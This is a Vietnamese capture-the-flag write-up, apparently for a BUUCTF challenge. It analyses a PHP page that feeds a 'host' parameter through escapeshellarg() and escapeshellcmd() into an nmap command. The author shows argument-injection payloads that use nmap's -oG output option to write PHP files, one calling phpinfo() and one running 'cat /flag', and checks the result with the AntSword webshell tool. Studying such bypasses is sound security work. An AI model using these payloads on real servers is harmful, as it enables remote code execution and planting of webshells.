Challenge cho ta source code sau:

```php
<?php
 
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
 
if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

Đầu tiên là `REMOTE_ADDR` và `X_FORWARDED_FOR` cũng ko quan trọng mấy.Ta có thể truyền tham số “host” thông qua method GET. Nếu tham số host có tồn tại thì nó sẽ được xử lí lần lượt qua 2 hàm `escapeshellarg()` và `escapeshellcmd()`.Đối với hàm `escapeshellarg()` trong PHP được sử dụng để bảo vệ các đối số được truyền vào cho một lệnh shell. Nó thực hiện việc xử lý các ký tự đặc biệt trong đối số để đảm bảo rằng chúng không được hiểu nhầm là các ký tự có ý nghĩa đặc biệt trong shell,và nó bọc dấu ngoặc đơn để đảm bảo rằng các ký tự đặc biệt không được hiểu là phần của lệnh, mà chỉ được coi là phần chuỗi.

`escapeshellcmd` Đảm bảo rằng user chỉ thực hiện một command.Dấu “\” sẽ được thêm vào trước các kí tự & #; `| \? ~ <> ^ () [] {} $ *, \ X0A và \ xFF

Sau khi xử lí host qua 2 hàm trên, thì nó tạo một thư mục với tên là một mã băm MD5 của chuỗi "glzjin" và địa chỉ IP của người dùng ($_SERVER['REMOTE_ADDR']). Điều này có thể tạo ra một thư mục duy nhất cho mỗi người dùng.Sau đó chuyển `you are in sandbox` vào thư mục được tạo.Cuối cùng, sử dụng hàm system() để thực thi lệnh "nmap" với các tùy chọn. Lệnh này sẽ chạy công cụ quét mạng Nmap với các tùy chọn "-T5 -sT -Pn --host-timeout 2 -F" và địa chỉ IP hoặc tên miền đã được truyền qua biến $_GET['host']. Kết quả của lệnh được xuất ra trình duyệt.

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/4c964fda-0b73-49b1-8969-07d3b48ad741)


![image](https://github.com/Llam-a/BUUCTF/assets/115911041/2bd5a9be-1080-46f1-979f-e7cdf3a96f3b)

Mình có đọc [wu](https://security.szurek.pl/en/exploit-bypass-php-escapeshellarg-escapeshellcmd/#gitlist-rce-exploit) này, theo wu viết thì có cách để bypass 2 hàm này là Argument injection - tấn côn dựa trên việc giả các tham số.Vậy ta có pass vào các option mới cho command.Tùy vào command mà challenge cho thì cách bypass khác nhau. Với command của challenge cho là

`nmap -T5 -sT -Pn --host-timeout 2 -F`

Viết một Trojan link

`?host=' <?php echo phpinfo();?> -oG test.php '`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/90600511-02cb-4825-b1ea-ce1ebb3a3d45)

Mình sử dụng antsword để check xem nó có hoạt động ko

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/5b42520c-d23a-49b2-bd12-dd80bf25dc40)

Mình tiếp tục inject, sử dụng option -oG của nmap để viết command và ouput vào 1 file.

`?host=' <?php echo `cat /flag`;?> -oG test.php '"`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/0f806814-75af-45c5-92d3-77a65e188bf0)

